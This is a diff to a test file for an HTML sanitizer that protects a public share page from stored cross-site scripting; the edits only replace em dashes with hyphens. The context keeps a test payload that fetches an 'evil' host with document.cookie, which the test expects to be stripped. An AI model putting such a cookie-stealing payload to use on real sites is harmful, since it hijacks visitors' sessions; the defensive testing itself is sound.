@@ -6,7 +6,7 @@ import { sanitizePageHtml } from "../apps/api/src/domains/projects/sanitize-page
  * public share route injects it with `dangerouslySetInnerHTML` for anonymous
  * visitors. These are the payloads that route has to survive.
  */
-describe("sanitizePageHtml — blocks stored XSS on the public share route", () => {
+describe("sanitizePageHtml - blocks stored XSS on the public share route", () => {
   it("removes script tags and their contents", () => {
     const out = sanitizePageHtml('<p>Hi</p><script>fetch("//evil/"+document.cookie)</script>');
     expect(out).not.toContain("<script");
@@ -68,7 +68,7 @@ describe("sanitizePageHtml — blocks stored XSS on the public share route", () 
   });
 });
 
-describe("sanitizePageHtml — preserves legitimate document content", () => {
+describe("sanitizePageHtml - preserves legitimate document content", () => {
   it("keeps the editor's formatting tags", () => {
     const html =
       "<h2>Findings</h2><p><strong>Roof</strong> shows <em>wear</em>.</p>" +
@@ -87,7 +87,7 @@ describe("sanitizePageHtml — preserves legitimate document content", () => {
       "https://cdn.example.com/a.jpg",
     );
     // An SVG delivered through <img> cannot execute script, so data: stays
-    // allowed for images — generated documents rely on it.
+    // allowed for images - generated documents rely on it.
     expect(sanitizePageHtml('<img src="data:image/png;base64,iVBORw0KGgo=">')).toContain(
       "data:image/png",
     );
@@ -104,7 +104,7 @@ describe("sanitizePageHtml — preserves legitimate document content", () => {
    * A task list is only a task list because of `data-type`. TipTap's extension
    * keys off it and styles.css draws the tick box from
    * `ul[data-type="taskList"]`, so stripping the attribute turned every
-   * checklist in a seeded template into plain bullets — and permanently, since
+   * checklist in a seeded template into plain bullets - and permanently, since
    * createPageFromTemplateService writes the sanitised HTML into project_pages.
    */
   it("keeps the checklist markup that makes a task list tickable", () => {
@@ -136,7 +136,7 @@ describe("sanitizePageHtml — preserves legitimate document content", () => {
    * `img { height: auto }` on every surface that renders stored HTML.
    *
    * The shared page is one of those surfaces, and it renders THIS function's
-   * output — so tightening `allowedStyles` would silently drop the box and put
+   * output - so tightening `allowedStyles` would silently drop the box and put
    * photos back to their natural aspect for the customer, with the editor still
    * showing the authored layout. Measured before the fix: a slot declaring
    * 280px rendered 127px on the shared page.
